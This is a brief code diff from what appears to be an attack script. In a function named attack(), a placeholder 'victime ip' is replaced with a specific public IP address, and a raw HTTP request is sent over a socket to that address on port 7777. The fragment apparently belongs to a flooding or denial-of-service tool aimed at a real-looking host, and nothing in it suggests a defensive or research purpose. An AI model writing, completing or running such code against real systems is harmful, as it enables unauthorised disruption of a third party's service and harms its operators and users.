@@ -18,7 +18,7 @@ def attack():
 
         s.connect(('15.235.149.57', 7777))
 
-        s.send(b'GET / HTTP/1.1\r\nHOST: victime ip\r\n\r\n')
+        s.send(b'GET / HTTP/1.1\r\nHOST: 15.235.149.57\r\n\r\n')
 
         resp = s.recv(4096)
 
